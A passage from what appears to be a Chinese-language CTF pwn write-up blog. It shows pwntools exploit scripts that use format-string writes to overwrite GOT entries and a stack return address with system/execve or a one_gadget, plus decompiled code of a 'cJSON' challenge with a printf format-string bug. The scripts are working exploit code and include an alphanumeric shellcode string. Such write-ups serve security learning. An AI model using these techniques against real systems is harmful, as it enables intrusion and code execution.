class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        exit_got=elf_base+<span class="number">0x4020</span></span><br><span class="line">        free_got=elf_base+<span class="number">0x4018</span></span><br><span class="line">        <span class="comment"># ru(b&#x27;your name?\n&#x27;)</span></span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        leak(<span class="string">&quot;exit_got&quot;</span>,exit_got)</span><br><span class="line"><span class="comment"># 第二步 覆盖exit_got 为 start</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload =b&#x27;%c&#x27;*(29-2)+fmt(&#x27;%&#123;(exit_got &amp; 0xffff)-27 &#125;c&#x27;)+b&#x27;%hn&#x27;</span></span><br><span class="line">        <span class="comment"># payload+=b&#x27;%c&#x27;*(58-2-29)+fmt(&#x27;%&#123;0xa1b0 - 0xa020 + 27-0x2&#125;c&#x27;)+b&#x27;%hn&#x27;</span></span><br><span class="line">        target=(elf_base+<span class="number">0x4020</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((elf_base+<span class="number">0x11B0</span>)&amp;<span class="number">0xffff</span>)+(<span class="number">0x10000</span>-target)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x142</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">58</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2-<span class="number">0x129</span>&#125;</span>c%hn&#x27;</span> </span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        system_add=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        stack_chk_fail_got=elf_base+<span class="number">0x4030</span></span><br><span class="line">        target=(stack_chk_fail_got)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=(execve)&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_1&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_1&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload) </span><br><span class="line">        debug()</span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(stack_chk_fail_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((execve&gt;&gt;(<span class="number">8</span>*<span class="number">2</span>)))&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_2&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_2&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>+<span class="number">1</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload) </span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(stack_chk_fail_got+<span class="number">4</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((execve&gt;&gt;(<span class="number">8</span>*<span class="number">4</span>)))&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_3&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_3&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(elf_base+<span class="number">0x4020</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=(elf_base+<span class="number">0x1130</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit_got&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;(target+<span class="number">361</span>+<span class="number">0x19</span>)):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit_got&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>+<span class="number">1</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload)  </span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        irt()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># irt()</span></span><br></pre></td></tr></table></figure><p>羡慕比赛写的出来的师傅们，简直太强了！！</p><h1 id="cJSON"><a href="#cJSON" class="headerlink" title="cJSON"></a>cJSON</h1><p>一个很恶心的题目，大部分的程序是没有用处的&#x2F;(ㄒoㄒ)&#x2F;~~，比赛的时候我居然是从头逆到尾，也是长记性了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="type">int</span> nbytes_4; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _DWORD v7[<span class="number">3</span>]; <span class="comment">// [rsp+14h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">myinit</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Init Data size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Err&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Json:&quot;</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(nbytes + <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  v10 = <span class="built_in">checkjson</span>((__int64)buf);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Parse fail&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes_4);</span><br><span class="line">      <span class="built_in">getchar</span>();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Data name:&quot;</span>);</span><br><span class="line">      <span class="built_in">fgets</span>(s, <span class="number">0x18</span>, stdin);</span><br><span class="line">      s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nbytes_4 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nbytes_4 &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">switch</span> ( nbytes_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;New data len:&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v7);</span><br><span class="line">          <span class="built_in">getchar</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v7[<span class="number">0</span>] &gt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = <span class="built_in">malloc</span>(v7[<span class="number">0</span>] + <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;New data:&quot;</span>);</span><br><span class="line">            <span class="built_in">read</span>(<span class="number">0</span>, v11, v7[<span class="number">0</span>]);</span><br><span class="line">            v4 = <span class="built_in">sub_5603</span>(v11);</span><br><span class="line">            <span class="built_in">sub_53BA</span>(v10, (__int64)s, v4);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Edit ok&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v8 = (<span class="type">char</span> *)<span class="built_in">sub_317E</span>(v10);</span><br><span class="line">          <span class="built_in">puts</span>(v8);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          *(_QWORD *)&amp;v7[<span class="number">1</span>] = <span class="built_in">sub_4662</span>(v10, (__int64)s);</span><br><span class="line">          <span class="keyword">if</span> ( !*(_QWORD *)&amp;v7[<span class="number">1</span>] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;target null&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">24LL</span>) == <span class="number">16</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%s]: %s\n&quot;</span>, s, *(<span class="type">const</span> <span class="type">char</span> **)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">32LL</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">24LL</span>) == <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%s]: %d\n&quot;</span>, s, *(<span class="type">unsigned</span> <span class="type">int</span> *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">40LL</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Err Type&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Read ok&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_25:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">del</span>(v10, s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Delete ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;parse fail.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是输入一个size，json然后也是一个功能性的程序，在delete函数中存在一个栈上的格式化字符串漏洞</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">del</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">sub_4662</span>(a1, a2);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;] been deleted&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4E2F</span>(a1, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么思路就是泄露-&gt;覆盖，也是比较清晰的</p><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>纯格式化字符串漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Data name:\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line">og=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;21&#x27;</span>)</span><br><span class="line">show(<span class="string">b&#x27;%27$p%10$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x8</span></span><br><span class="line">leak(<span class="string">&#x27;stack_ret&#x27;</span>,stack_ret)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+og[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">payload=(fmt(<span class="string">&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;</span>)+<span class="string">b&#x27;%22$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(stack_ret)</span><br><span class="line">show(payload)</span><br><span class="line"></span><br><span class="line">payload=(fmt(<span class="string">&#x27;%&#123;(one_gadget&gt;&gt;16) &amp; 0xffff&#125;c&#x27;</span>)+<span class="string">b&#x27;%22$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(stack_ret+<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;name:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>格式化字符串漏洞+栈溢出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">sub_15B6</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 (__fastcall **a2)(<span class="type">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+10h] 